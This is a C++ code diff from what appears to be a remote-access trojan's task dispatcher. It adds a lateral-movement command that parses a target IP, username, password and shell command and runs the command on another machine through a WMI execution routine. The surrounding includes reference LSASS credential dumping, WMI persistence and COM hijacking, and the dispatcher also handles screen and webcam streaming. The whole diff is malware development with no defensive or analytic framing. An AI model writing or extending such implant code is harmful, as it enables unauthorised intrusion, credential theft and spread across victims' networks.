@@ -15,6 +15,7 @@
 #include "../persistence/WmiPersistence.h"
 #include "../persistence/ComHijacker.h"
 #include "../credential/LsassDumper.h"
+#include "../lateral/WmiExec.h"
 #include "../fs/FileSystem.h"
 #include "../recon/DeepRecon.h"
 #include "../crypto/Base64.h"
@@ -112,6 +113,18 @@ void TaskDispatcher::dispatch(const Task& task) {
                     streaming::StopScreenStream();
                     result.output = "SCREEN_STREAM_STATUS:Screen stream stopped";
                 }
+                break;
+            }
+            case TaskType::LATERAL_RCE: {
+                // Parse cmd: target_ip|user|pass|command
+                std::string target, user, pass, rcmd;
+                std::istringstream iss(task.cmd);
+                std::getline(iss, target, '|');
+                std::getline(iss, user, '|');
+                std::getline(iss, pass, '|');
+                std::getline(iss, rcmd); // rest as command
+
+                result.output = "LATERAL_RCE:" + lateral::WmiExec(target, user, pass, rcmd);
                 break;
             }
             case TaskType::WEBCAM_STREAM: {
